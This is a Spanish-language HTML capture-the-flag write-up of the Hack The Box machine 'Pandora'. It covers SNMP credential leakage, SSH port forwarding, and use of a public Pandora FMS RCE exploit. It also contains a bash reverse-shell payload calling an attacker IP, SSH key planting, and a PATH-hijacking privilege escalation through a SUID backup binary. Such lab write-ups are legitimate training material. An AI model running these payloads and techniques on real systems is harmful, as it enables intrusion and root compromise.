@@ -1,0 +1,127 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>RuyzTz7 | Pandora HTB</title>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell writeup-detail-shell">
+      <a class="back-link" href="/writeups/linux.html">~/writeups/linux</a>
+
+      <section class="writeup-detail-hero">
+        <img src="/writeups/assets/pandora/pasted-20260415003700.png" alt="Pandora HTB" />
+        <div>
+          <p class="eyebrow">HTB / machines / Linux</p>
+          <h1>Pandora</h1>
+          <div class="tag-list" aria-label="Tags">
+            <span>id_rsa</span>
+            <span>path_hijacking</span>
+            <span>vhosts</span>
+            <span>pandora</span>
+          </div>
+        </div>
+      </section>
+
+      <article class="writeup-article">
+        <section class="writeup-section">
+          <h2>Índice</h2>
+          <ul>
+            <li><code>Enumeración</code>: SNMP por UDP expone credenciales de usuario</li>
+            <li><code>Explotación</code>: Acceso SSH y descubrimiento del vhost interno de Pandora</li>
+            <li><code>Movimiento lateral</code>: Port forwarding hacia Pandora FMS vulnerable a RCE sin autenticar</li>
+            <li><code>Escalada de Privilegios</code>: SUID <code>pandora_backup</code> ejecuta <code>tar</code> de forma relativa y permite path hijacking</li>
+          </ul>
+        </section>
+        <section class="writeup-section">
+          <h2>Enumeración</h2>
+          <img class="writeup-image" src="/writeups/assets/pandora/pasted-20260415003906.png" alt="Pandora HTB" />
+          <img class="writeup-image" src="/writeups/assets/pandora/pasted-20260415004832.png" alt="Pandora HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Explotación</h2>
+          <div class="code-card">
+            <h3>Enumerar procesos por SNMP</h3>
+            <pre><code>snmpbulkwalk -v2c -c public 10.129.20.185 1.3.6.1.2.1.25.4.2.1.5 | grep -v '""'
+ssh daniel@10.129.20.185
+# Password: HotelBabylon23</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pandora/pasted-20260415005339.png" alt="Pandora HTB" />
+          <img class="writeup-image" src="/writeups/assets/pandora/pasted-20260415005319.png" alt="Pandora HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Movimiento lateral: Virtual Hosting</h2>
+          <div class="code-card">
+            <h3>Virtual Hosting</h3>
+            <pre><code>cat /etc/apache2/sites-available/pandora.conf
+# Vemos un nuevo dominio al que no tenemos acceso desde fuera: pandora.panda.htb</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pandora/pasted-20260415012912.png" alt="Pandora HTB" />
+          <div class="code-card">
+            <h3>Port forwarding</h3>
+            <pre><code>ssh -L 80:127.0.0.1:80 daniel@10.129.20.185
+# Password: HotelBabylon23</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pandora/pasted-20260415013131.png" alt="Pandora HTB" />
+          <p><a href="https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated">Exploit</a></p>
+          <div class="code-card">
+            <h3>Exploit</h3>
+            <pre><code>python3 sqlpwn.py -t 127.0.0.1:80
+# Obtenemos RCE: bash -c "bash -i &gt;%26 /dev/tcp/10.10.16.178/443 0&gt;%261"</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pandora/pasted-20260415013833.png" alt="Pandora HTB" />
+          <img class="writeup-image" src="/writeups/assets/pandora/pasted-20260415013825.png" alt="Pandora HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Escalada de Privilegios</h2>
+          <div class="code-card">
+            <h3>Crear claves para matt y conectarnos por SSH ya que sudo nos da ruido desde la Reverse shell</h3>
+            <pre><code># Target
+ssh-keygen
+cd /home/matt/.ssh
+cp id_rsa.pub authorized_keys
+chmod 600 authorized_keys
+# Copiar Clave privada id_rsa
+
+# Kali: Copiar id_rsa y dar permisos 600
+ssh -i id_rsa matt@10.129.20.185</code></pre>
+          </div>
+          <div class="code-card">
+            <h3>SUID</h3>
+            <pre><code>find / -perm -4000 2&gt;/dev/null 
+# Binario pandora_backup</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pandora/pasted-20260415015905.png" alt="Pandora HTB" />
+          <div class="code-card">
+            <h3>Interpretar binario</h3>
+            <pre><code>cat /usr/bin/pandora_backup
+# Ejecuta tar desde ruta relativa y como root</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pandora/pasted-20260415020013.png" alt="Pandora HTB" />
+          <div class="code-card">
+            <h3>Path Hijacking</h3>
+            <pre><code># Crear fichero /tmp/tar con el contenido chmod u+s /bin/bash
+chmod +x /tmp/tar
+export PATH=/tmp:$PATH
+/usr/bin/pandora_backup</code></pre>
+          </div>
+          <img class="writeup-image" src="/writeups/assets/pandora/pasted-20260415020159.png" alt="Pandora HTB" />
+        </section>
+        <section class="writeup-section">
+          <h2>Tags</h2>
+          <div class="tag-list">
+            <span>id_rsa</span>
+            <span>path_hijacking</span>
+            <span>vhosts</span>
+            <span>pandora</span>
+            <span>portforwarding</span>
+            <span>UDP</span>
+            <span>snmp</span>
+          </div>
+        </section>
+      </article>
+    </main>
+  </body>
+</html>
